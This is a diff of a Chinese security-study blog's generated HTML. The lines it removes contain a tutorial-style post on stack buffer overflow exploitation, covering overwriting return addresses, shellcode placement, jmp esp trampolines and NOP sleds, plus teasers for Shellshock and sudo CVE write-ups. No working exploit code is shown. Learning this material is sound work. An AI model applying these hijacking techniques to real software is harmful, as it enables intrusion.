-        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/11/13/0day%E5%AE%89%E5%85%A8--%E6%A0%88%E6%BA%A2%E5%87%BA/">0day安全--栈溢出</a>
-    </h1>
   
-
-        
-        
-<a href="/2019/11/13/0day%E5%AE%89%E5%85%A8--%E6%A0%88%E6%BA%A2%E5%87%BA/" class="archive-article-date">
-  	<time datetime="2019-11-13T00:33:44.348Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-13</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="0day安全–栈溢出利用的相关感悟"><a href="#0day安全–栈溢出利用的相关感悟" class="headerlink" title="0day安全–栈溢出利用的相关感悟"></a>0day安全–栈溢出利用的相关感悟</h1><blockquote>
-<p>引言：<br>其实缓冲区溢出的原理，个人认为总体来说道理相近，大缓冲区数据向小缓冲区复制的过程，由于没有注意到小缓冲区的边界，撑爆了较小的缓冲区，冲掉了和小缓冲区相邻内存区域的其他数据而引起的内存问题。利用缓冲区溢出漏洞可以修改内存中变量的值，甚至可以劫持进程、执行恶意代码、获得主机控制权，这种对内存区域的淹没与覆盖，可以利用，做各种花式操作</p>
-</blockquote>
-<blockquote>
-<p>但是我要说明的是，溢出漏洞远远不像想象中的那么简单，本次交流栈溢出的相关利用，以及shellcode的使用。</p>
-</blockquote>
-<h2 id="1-系统栈的工作原理"><a href="#1-系统栈的工作原理" class="headerlink" title="1.系统栈的工作原理"></a>1.系统栈的工作原理</h2><p>（1）进程使用的内存可以按照功能分成4个部分：<br>    （1）代码区：存储被装入执行的二进制代码<br>    （2）数据区：用于存储全局变量<br>    （3）堆区：进程可以在堆区 动态请求一定大小的内存，并在用完之后归还给堆区，动态分配和回收是堆区的特点。<br>    （4）栈区：用于动态的存储函数之间的调用关系，以保证被调用函数在返回时恢复到母函数中继续执行。<br>（2）函数调用时的过程：调用到函数时，压入栈帧、返回地址、局部变量、新函数的栈帧，要返回时，只需要弹出自己的栈帧并获得返回地址，之后调回原函数代码区继续执行。（在实际运行过程中，main函数并不是第一个调用的函数，程序被装入内存前还有其他操作）</p>
-<p>一定要注意调用函数压栈顺序，比如局部变量作为一个参数压入栈，这时候，敏感的同学应该就能意识到，这种方式就很有可能造成栈溢出。<br>（3)寄存器与函数栈帧：ESP、EBP：EBP标识当前栈帧的底部、ESP标识当前栈帧的顶部<br>函数栈帧中，包含的信息：<br>    （1）局部变量：为函数局部变量开辟的内存空间<br>    （2）栈帧状态值：保存前栈帧的顶部和底部（实际上只保存前栈帧的底部，前栈帧的顶部可以通过堆栈平衡计算），用于在本帧被弹出后恢复上一个栈帧。<br>    （3）函数返回地址：存放函数调用前的指令位置，以便函数返回是能够恢复到函数被调用前的代码区执行指令</p>
-<p>(4)函数调用大致包括：参数入栈–返回地址入栈–代码区跳转–栈帧调整（包括：保存当前栈帧状态值–EBP入栈、将当前栈帧切换到新栈帧–将ESP值装入EBP，更新栈帧底部、给新栈帧分配空间–把ESP减去所需空间的大小，抬高栈顶）<br>函数返回大致包括：保存返回值（通常将返回值放入EAX中）–弹出当前栈帧、恢复上一个栈帧（包括：在堆栈平衡的基础上，给ESP加上栈帧的大小，降低栈顶，回收当前栈帧的空间–将当前栈帧底部保存的前栈帧EBP值弹入EBP寄存器，恢复出上一个栈帧–将函数返回地址弹给EIP寄存器）–跳转（按照函数返回值调回母函数继续执行）</p>
-<h2 id="2-修改邻接变量"><a href="#2-修改邻接变量" class="headerlink" title="2.修改邻接变量"></a>2.修改邻接变量</h2><p>就如同刚刚所讲的，函数局部变量在栈中一个接一个排列，假如局部变量有类似数组之类的缓冲区，并且存在数组越界的缺陷，那么越界的数组元素就有可能破坏栈中相邻变量的值，甚至可以破坏栈中所保存的EBP的值、返回地址等重要数据。</p>
-<p>示例如下图：<br><img src="https://github.com/rabbitboat/IMG/raw/master/image/0day--%E6%A0%88%E6%BA%A2%E5%87%BA_files/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%9A%84%E5%AE%9E%E7%8E%B0.png" alt="show1"></p>
-<p>给出下面的代码实例，下段代码会实现栈溢出<br><img src="https://github.com/rabbitboat/IMG/raw/master/image/0day--%E6%A0%88%E6%BA%A2%E5%87%BA_files/%E6%A0%88%E6%BA%A2%E5%87%BA.png" alt="show1"></p>
-<p>利用溢出的知识，继续向后进行覆盖，从而达到替换返回地址区域数据的目的，从而可以修改函数的返回地址。栈溢出不仅可以通过手工输入去实现，还可以通过读取txt文件来实现栈溢出  </p>
-<p>下段代码为示例：<br><img src="https://github.com/rabbitboat/IMG/raw/master/image/0day--%E6%A0%88%E6%BA%A2%E5%87%BA_files/QQ%E6%88%AA%E5%9B%BE20191103223547.png" alt="show1"></p>
-<p>当然，利用修改返回地址的方法，我们又可以利用，向目标进程中植入代码，我们可以将返回地址指向我们想执行的代码位置，之后将缓冲区填充为我们想要执行的代码。</p>
-<p>上述讲的几个利用方式，利用栈溢出的四个利用思路其实本身很好想，但是实现起来难度大，主要是需要看源码，看对栈溢出的敏感度，尤其是strcmp这种强行的赋值指令，很危险。</p>
-<p>还有一个疑惑，为什么要把代码放到栈内的空间，而不直接加载到代码段内的空间呢？个人认为是因为代码段内的空间具有未知性，而栈空间是可控的，不要如果把返回地址定位到栈空间段（虽然不是代码段），但是CPU还是会取指向下执行，如果发现不是可执行代码，则会报错</p>
-<p>下面的图将解答我们的疑惑：<br><img src="https://github.com/rabbitboat/IMG/raw/master/image/0day--%E6%A0%88%E6%BA%A2%E5%87%BA_files/%E6%8A%A5%E9%94%99.png" alt="show1"></p>
-<p>这个图虽然是为了第三章铺垫，但是深刻地解答出了我心中的疑惑</p>
-<h2 id="3-开发shellcode"><a href="#3-开发shellcode" class="headerlink" title="3.开发shellcode"></a>3.开发shellcode</h2><blockquote>
-<p>shellcode：通称缓冲区溢出攻击中植入进程的代码<br>exploit：制作出一个具有攻击效果的“承载”着shellcode的输入字符串，用于生成攻击性的网络数据包或者其它形式的攻击性输入。核心就是淹没返回地址，劫持进程控制权，之后跳转去执行shellcode</p>
-</blockquote>
-<p>其实如果把shellcode和exploit比作导弹，exploit为承载弹头的东西，shellcode为弹头本身（我们需要执行的代码）</p>
-<p>在Metasploit中，受害主机会被当作一个叫target的选项进行配置，而shellcode也有更形象的名字：payload（更加形象了吧）</p>
-<p>但是在我们平日利用时，尤其是2中所介绍的，我们要查出shellcode的起始地址，但实际调试漏洞中，会发现栈中地址是动态变化的，因此要写出通用的shellcode就必须使程序能够自动定位到shellcode的起始地址。</p>
-<p>用jmp esp作为跳板，不论栈帧怎么移位，都能精确地跳回栈区。<br>（1）用任意一个jmp esp指令的地址覆盖函数返回地址<br>（2）函数返回后被重定向去执行jmp esp指令<br>（3）由于esp在函数返回后仍指向栈区，jmp esp指令执行后，处理器会到栈区函数返回地址之后的地方取指令执行<br>（4）重新布置shellcode，在淹没函数返回地址后，继续淹没一片栈空间，将shellcode恰好摆在函数返回地址后，jmp esp指令执行后，会恰好跳进shellcode</p>
-<p>shellcode还有一些处理方式：</p>
-<p>1.抬高栈顶保护shellcode</p>
-<p>示例如图：<br><img src="https://github.com/rabbitboat/IMG/raw/master/image/0day-%E5%BC%80%E5%8F%91shellcode_files/%E4%BF%9D%E6%8A%A4shellcode.png" alt="show1"></p>
-<p>2.填充nop，只要jmp sp能够落入nop中，就可以一直向下执行，直到找到真正的shellcode（我姑且称这种处理方式为nop淹没法）</p>
-<blockquote>
-<p>编写shellcode，还需要的就是如何找到jmp esp这条指令的地址，我们最好要找到一个不同程序加载后，这个地址都不变的情况，因此我们要利用windows编程每次都会导入的动态链接库（比如kernel32.dll），具体的例子可以自己去调试或者尝试。</p>
-</blockquote>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color1">0day安全 栈溢出</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/11/13/0day%E5%AE%89%E5%85%A8--%E6%A0%88%E6%BA%A2%E5%87%BA/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" target="_blank" rel="noopener" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-cve-2014-6271" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/11/13/cve-2014-6271/">cve-2014-6271</a>
-    </h1>
+  <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
+<script>
+  var cloudTieConfig = {
+    url: "http://yoursite.com/2019/11/17/0day%E5%AE%89%E5%85%A83--%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84%E5%88%A9%E7%94%A8/", 
+    sourceId: "0day安全3--堆溢出的利用",
+    productKey: "true",
+    target: "cloud-tie-wrapper"
+  };
+</script>
+<script src="//img1.cache.netease.com/f2e/tie/yun/sdk/loader.js"></script>
   
 
-        
-        
-<a href="/2019/11/13/cve-2014-6271/" class="archive-article-date">
-  	<time datetime="2019-11-12T23:39:16.101Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-13</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="CVE-2014-6271-shellshock漏洞分析"><a href="#CVE-2014-6271-shellshock漏洞分析" class="headerlink" title="CVE-2014-6271(shellshock漏洞分析)"></a>CVE-2014-6271(shellshock漏洞分析)</h1><h2 id="1-漏洞概述"><a href="#1-漏洞概述" class="headerlink" title="1.漏洞概述"></a>1.漏洞概述</h2><p>2014年9月24日Bash被公布存在远程代码执行漏洞，安天实验室安全研究与应急处理中心(以下简称：安天CERT)第一时间根据信息研判，确认该漏洞可以产生严重的后果，且分布广泛，于北京时间9月24日早晨5时30分启动了A级风险应急响应。</p>
-        
-          <a class="article-more-a" href="/2019/11/13/cve-2014-6271/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color1">cve漏洞</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/11/13/cve-2014-6271/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" target="_blank" rel="noopener" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-cve-2019-14287" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/11/12/cve-2019-14287/">cve-2019-14287</a>
-    </h1>
   
 
-        
-        
-<a href="/2019/11/12/cve-2019-14287/" class="archive-article-date">
-  	<time datetime="2019-11-12T15:30:33.607Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="CVE-2019-14287-Linux-sudo漏洞分析及复现"><a href="#CVE-2019-14287-Linux-sudo漏洞分析及复现" class="headerlink" title="CVE-2019-14287(Linux sudo漏洞分析及复现)"></a>CVE-2019-14287(Linux sudo漏洞分析及复现)</h1><h2 id="1-漏洞复现"><a href="#1-漏洞复现" class="headerlink" title="1.漏洞复现"></a>1.漏洞复现</h2><p>首先添加用户（为用户设置密码）</p>
-        
-          <a class="article-more-a" href="/2019/11/12/cve-2019-14287/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color1">cve漏洞</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/11/12/cve-2019-14287/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" target="_blank" rel="noopener" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Eclipse+qemu调试ucore" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/11/12/Eclipse+qemu%E8%B0%83%E8%AF%95ucore/">Eclipse+qemu调试ucore</a>
-    </h1>
   
 
-        
-        
-<a href="/2019/11/12/Eclipse+qemu%E8%B0%83%E8%AF%95ucore/" class="archive-article-date">
-  	<time datetime="2019-11-12T13:01:57.929Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="利用Eclipse调试Ucore"><a href="#利用Eclipse调试Ucore" class="headerlink" title="利用Eclipse调试Ucore"></a>利用Eclipse调试Ucore</h1><h2 id="1-配置环境"><a href="#1-配置环境" class="headerlink" title="1.配置环境"></a>1.配置环境</h2><blockquote>
-<p>Eclipse 是一个开放源代码的、基于Java的可扩展开发平台。就其本身而言，它只是一个框架和一组服务，用于通过插件组件构建开发环境。</p>
-</blockquote>
-        
-          <a class="article-more-a" href="/2019/11/12/Eclipse+qemu%E8%B0%83%E8%AF%95ucore/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color5">操作系统</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/11/12/Eclipse+qemu%E8%B0%83%E8%AF%95ucore/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" target="_blank" rel="noopener" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-love" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/11/11/love/">love</a>
-    </h1>
-  
-
-        
-        
-<a href="/2019/11/11/love/" class="archive-article-date">
-  	<time datetime="2019-11-11T15:47:54.850Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-11</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="兔兔和小船的故事"><a href="#兔兔和小船的故事" class="headerlink" title="兔兔和小船的故事"></a>兔兔和小船的故事</h1>
-        
-          <a class="article-more-a" href="/2019/11/11/love/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color1">兔兔和小船</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/11/11/love/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" target="_blank" rel="noopener" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Apache服务器搭建" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/11/11/Apache%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/">Apache服务器搭建</a>
-    </h1>
-  
-
-        
-        
-<a href="/2019/11/11/Apache%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/" class="archive-article-date">
-  	<time datetime="2019-11-11T15:39:24.607Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-11</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Apache服务器配置-实验"><a href="#Apache服务器配置-实验" class="headerlink" title="Apache服务器配置 实验"></a>Apache服务器配置 实验</h1><p>声明：本次实验基于KaliLinux环境（Debian.x 64位）</p>
-        
-          <a class="article-more-a" href="/2019/11/11/Apache%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color3">计网</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/11/11/Apache%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" target="_blank" rel="noopener" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-lab1--宋恩舟" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/11/11/lab1--%E5%AE%8B%E6%81%A9%E8%88%9F/">lab1--宋恩舟</a>
-    </h1>
-  
-
-        
-        
-<a href="/2019/11/11/lab1--%E5%AE%8B%E6%81%A9%E8%88%9F/" class="archive-article-date">
-  	<time datetime="2019-11-11T01:54:58.335Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-11</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="ucore实验报告—LAB1"><a href="#ucore实验报告—LAB1" class="headerlink" title="ucore实验报告—LAB1"></a>ucore实验报告—LAB1</h1><h2 id="练习1"><a href="#练习1" class="headerlink" title="练习1"></a>练习1</h2>
-        
-          <a class="article-more-a" href="/2019/11/11/lab1--%E5%AE%8B%E6%81%A9%E8%88%9F/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color5">操作系统</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/11/11/lab1--%E5%AE%8B%E6%81%A9%E8%88%9F/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" target="_blank" rel="noopener" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
 
 
@@ -979,8 +386,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: false,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
